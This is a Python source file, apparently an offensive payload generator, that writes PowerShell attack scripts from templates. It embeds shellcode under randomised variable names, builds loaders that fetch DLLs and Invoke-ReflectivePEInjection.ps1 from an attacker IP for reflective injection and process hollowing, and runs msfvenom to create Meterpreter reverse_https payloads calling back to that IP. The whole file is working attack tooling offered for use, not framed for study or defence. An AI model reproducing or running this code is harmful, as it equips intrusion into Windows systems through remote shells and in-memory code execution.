import multiprocessing
import random
import string
import subprocess

def generate_ps1(ip,shellcode):
    t1(ip,shellcode["1"])
    t2(ip)
    t3(ip)
    t4(ip)
    pass

# inject.ps1
def t1(ip,shellcode):
    hexshellcode =  ", ".join(["0x{:02x}".format(num) for num in shellcode])
    bufname = random_name()
    shellcode = "[Byte[]] $"+ bufname +" = " + hexshellcode
    with open("data/powershell/rev1.txt","r") as f:
        content = f.read()
    content = content.format(shellcode=shellcode,bufname=bufname)
    with open("out/ps1/rev1.ps1","w") as f:
        f.write(content)
    with open("out/ps1/rev1.txt","w") as f:
        f.write(content)

def random_name():
    length = random.randint(4,8)
    return ''.join(random.choices(string.ascii_letters, k=length))

# reflection.ps1 injection
def t2(ip):
    
    path = "http://"+ ip + "/out/dll/ClassLibrary1.dll"
    with open("data/powershell/reflection_inject.txt","r") as f:
        content = f.read()
    content = content.format(path=path)
    with open("out/ps1/reflec1.txt","w") as f:
        f.write(content)


# reflection.ps1 hollow
def t5(ip):
    
    path = "http://"+ ip + "/out/dll/ClassLibrary2.dll"
    with open("data/powershell/reflection_hollow.txt","r") as f:
        content = f.read()
    content = content.format(path=path)
    with open("out/ps1/reflec2.txt","w") as f:
        f.write(content)


# reflectDLL.ps1
# 
def t3(ip):
    script = "http://"+ip+"/tools/ps1/Invoke-ReflectivePEInjection.ps1"
    dll = "http://" + ip
    with open("data/powershell/reflectDLL.txt","r") as f:
        content = f.read()
    content = content.format(ip=ip)
    with open("out/ps1/reflectDLL.txt","w") as f:
        f.write(content) 

# msfvenom默认
def t4(ip):
    command = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST="+ip+" LPORT=443 -f psh-reflection -o ./out/ps1/met.ps1"
    with subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) as result:
        line = result.stdout.readlines()
    command = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST="+ip+" LPORT=443 EXITFUNC=thread -f ps1 -o ./out/ps1/met_thread.ps1"
    with subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) as result:
        line = result.stdout.readlines()


    











